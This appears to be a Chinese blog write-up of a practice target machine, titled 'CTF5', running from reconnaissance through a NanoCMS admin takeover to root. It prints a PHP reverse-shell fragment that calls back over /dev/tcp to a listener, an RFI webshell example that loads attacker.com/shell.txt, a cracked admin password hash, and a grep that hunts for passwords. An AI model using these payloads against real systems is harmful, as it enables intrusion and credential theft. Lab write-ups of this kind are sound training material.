+++
title = "CTF5"
date = 2026-06-15T20:19:37+08:00
draft = false
description = "一些打过的靶机"
tags = ["靶机"]
categories = ["靶机"]
series = ["靶机"]
pin = false
cover = "/images/posts/java-security-cover-clean.svg"
+++
信息搜集  
  
发现开的端口巨多  
  
  
![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260120215510608.png)  
  
  
看看80  
  
发现了登录框  
  
![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260120220007551.png)  
  
  
![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260120215627710.png)  
  
来看看一些445端口泄露了什么  
  
发现疑似账户  
  
![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260120220152816.png)  
  
  
连接一下试试看，发现登录失败了  
  
那就看其他的突破口来试试，来扫一下目录啥的  
  
扫出来了几个敏感目录  
  
![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260120221709039.png)  
  
  
  
/events /inc /info.php /list /mail /login.php /phpmyadmin /ChangeLog /README /index.php /squirrelmail  
  
这些路径都挨个试一试下  
  
有登录页面  
  
  
![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260120222525804.png)  
  
  
  
  
发现这一个泄露了配置文件  
  
![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260120222409411.png)  
  
  
有注册页面  
  
![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260120222455486.png)  
  
登录页面  
![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260120222603657.png)  
  
数据库的登录页面  
  
![](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260120222630356.png)  
  
然后发现这是一个  
  
![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260120222820911.png)  
  
  
接下来我们用那个nikto来扫描这个网站潜在的漏洞  
  

```
c极高危漏洞 (Critical)这几个漏洞极大概率能让你直接获得服务器权限（Webshell）或数据库权限。1. 远程文件包含 (RFI) / 本地文件包含 (LFI)> + /info.php?file=http://blog.cirt.net/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list. + /index.php: PHP include error may indicate local or remote file inclusion is possible.- 解读：这是扫描报告中最致命的一项。扫描器发现 /info.php 似乎存在文件包含漏洞，并且成功测试了远程包含。    - 利用思路：        - GetShell：攻击者可以在自己的服务器上搭建一个包含恶意 PHP 代码的文件（如 shell.txt，内容为 <?php system($_GET'cmd']); ?>），然后通过 URL http://61.139.2.137/info.php?file=http://attacker.com/shell.txt 让目标服务器去执行它，从而直接拿到 Webshell。            - 读取敏感文件：如果是本地文件包含（LFI），可以尝试读取 /etc/passwd (Linux) 或 C:\Windows\win.ini (Windows)。        2. 敏感配置文件泄露> + /#wp-config.php#: #wp-config.php# file found. This file contains the credentials.- 解读：这通常是编辑器（如 Emacs/Vim）留下的临时备份文件。wp-config.php 是 WordPress 的核心配置文件。    - 利用思路：        - 数据库沦陷：直接下载访问 http://61.139.2.137/#wp-config.php#，你可能会看到明文的数据库账号、密码、数据库主机地址以及 WordPress 的认证密钥（Salts）。            - 结合前面的 phpMyAdmin 暴露，可以直接登录数据库改写数据或上传 Webshell。        3. phpMyAdmin 暴露及未授权访问风险> + /phpmyadmin/: phpMyAdmin directory found. + /phpmyadmin/changelog.php ...- 解读：数据库管理后台直接暴露在公网。    - 利用思路：        - 弱口令爆破：配合 Hydra 等工具爆破 root 密码。            - 直接登录：如果利用第2点拿到了 wp-config.php 中的数据库密码，可以直接在此处登录，完全控制数据库。            - 写入Webshell：登录后利用 SELECT ... INTO OUTFILE 写入一句话木马拿到服务器权限。        <hr style="border: 0; border-top: 1px solid #ddd; margin: 20px 0;">🔴 高危漏洞 (High)1. phpinfo() 信息泄露> + /info.php: Output from the phpinfo() function was found.- 解读：网站上遗留了测试文件。    - 危害：        - 泄露了绝对路径（这对文件包含漏洞和写 Webshell 至关重要）。            - 泄露了 PHP 版本、系统版本、已安装的扩展、禁用的函数列表（disable_functions）等，为攻击者定制攻击载荷提供了精确蓝图。        2. 软件版本严重过时> + Server: Apache/2.2.6 (Fedora) + /: Retrieved x-powered-by header: PHP/5.2.4.- 解读：        - Apache 2.2.6 发布于 2007 年，PHP 5.2.4 发布于 2007 年。            - 利用思路：这些古董级版本存在大量已知的 CVE 漏洞（如缓冲区溢出等），可以使用 Metasploit 直接搜索对应版本的 Exploit 进行攻击。        3. HTTP TRACE 方法开启 (XST 攻击)> + /: HTTP TRACE method is active which suggests the host is vulnerable to XST.- 危害：允许跨站追踪攻击（Cross-Site Tracing），可能绕过 HttpOnly 标记窃取用户的 Cookie。    <hr style="border: 0; border-top: 1px solid #ddd; margin: 20px 0;">🟠 中低危漏洞 (Medium/Low)1. 目录遍历 (Directory Indexing)> + /icons/: Directory indexing found.- 解读：访问 /icons/ 目录会列出所有文件。虽然 icons 目录通常只放图标，但如果发生在上传目录或备份目录，将直接泄露所有文件名。    2. SquirrelMail 暴露> + /squirrelmail/src/read_body.php: SquirrelMail found.- 解读：发现 Web 邮件系统。如果版本过旧，可能存在远程代码执行漏洞。    3. PHP 彩蛋信息泄露> + /?=PHPB8B5F2A0...- 解读：这是 PHP 的一个特性，虽然本身危害不大，但确认了服务器确实在运行 PHP，且未屏蔽此类指纹。
```

[  
  
发现不能包含，但是没有禁用3的函数  
  
![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260120224031020.png)  
  
  
回过头在/list那里输入了一个单引号发现报错了  
  
![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260120225039814.png)  
  
  
这里大概率存在sql注入，但是没有注入出来，然后我们选择回头看看[NanoCMS] 是否存在漏洞  
  
  
![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260121101849454.png)  
  
发现存在一个rce 但是需要认证，所以我们得搞到账户和密码  
  
  
![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260121102224477.png)  
  
疑似信息泄露的密码，我们进行拼接尝试一下 /data/pagesdata.txt  
  
  
![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260121102348359.png)  
  
  
爆出东西了,发现了账号和密码  
  
  

```
ca:12:{s:8:"homepage";s:1:"1";s:10:"links_cats";a:4:{s:7:"sidebar";a:2:{i:0;i:1;i:1;i:4;}s:11:"other-pages";a:0:{}s:14:"top-navigation";a:2:{i:0;s:1:"1";i:1;s:1:"4";}s:12:"Footer-Right";a:2:{i:0;s:1:"1";i:1;s:1:"4";}}s:5:"slugs";a:2:{i:1;s:4:"home";i:4;s:7:"contact";}s:6:"titles";a:2:{i:1;s:4:"Home";i:4;s:7:"Contact";}s:10:"slug_count";i:11;s:8:"settings";a:3:{s:19:"index-last-modified";i:1234513760;s:18:"def-template-areas";a:4:{i:0;s:12:"website name";i:2;s:14:"website slogan";i:3;s:16:"below navigation";i:4;s:16:"copyright notice";}s:18:"def-template-links";a:2:{i:0;s:14:"top-navigation";i:1;s:12:"Footer-Right";}}s:13:"active-tweaks";a:2:{i:0;s:7:"deutsch";i:1;s:19:"language-pack-tweak";}s:11:"lang-select";s:7:"english";s:6:"seourl";s:1:"0";s:8:"username";s:5:"admin";s:8:"password";s:32:"9d2f75377ac0ab991d40c91fd27e52fd";s:7:"version";s:4:"v_4f";}
```

  
  
然后进行爆破试一试，发现是md5  
  
![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260121102515329.png)  
  
  
也是成功跑出来了，发现密码是 shannon  
  
![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260121104434482.png)  
  
  
我们尝试登录一下  
  
发现登录成功  
  
![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260121104601657.png)  
  
  
发现这里可以添加文章，那么我们就可以在这里添加一个木马文件来试一试能不能反弹shell  
  
  
可以msf生成，也可以用kali自带的反弹shell的脚本 或者直接使用脚本  
  
  
```
& /dev/tcp/61.139.2.130/4444 0>&1'");?>  
```
  
  
都可以  
  
  
```
cp /usr/share/webshells/php/php-reverse-shell.php ./shell.php
```  


我们使用msf生成一个  
  
我们直接生成源文件，就不指定那个输出一个shell.php文件了  
  
![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260121105540445.png)  
  
  
然后我们上传到添加那里，修改为111  
  
  
![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260121105647327.png)  
  
  
保存，发现已经有111了  
  
  
![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260121105705624.png)  
  
  
这时候我们开启监听，发现shell已经弹过来了  
  
  
![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260121110742879.png)  
  
  
进行信息搜集  
  
  
![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260121111149378.png)  
  
  
发现用户有点多，但是都没有什么用  
  
查看历史信息  
  
```
grep -R -i pass /home/* 2>/dev/null  
```
  
  
  
![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260121111715745.png)  
  
  
发现有一个目录文件比较可疑  
  
![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260121111747998.png)  
  
  
我们进行查看这个文件看看是怎么样的  
  
  
![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260121111840886.png)  
  
  
发现这里的密码有点可疑，我们尝试登录一下  
  
![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260121111956792.png)  
  
  
发现成功登录到root权限
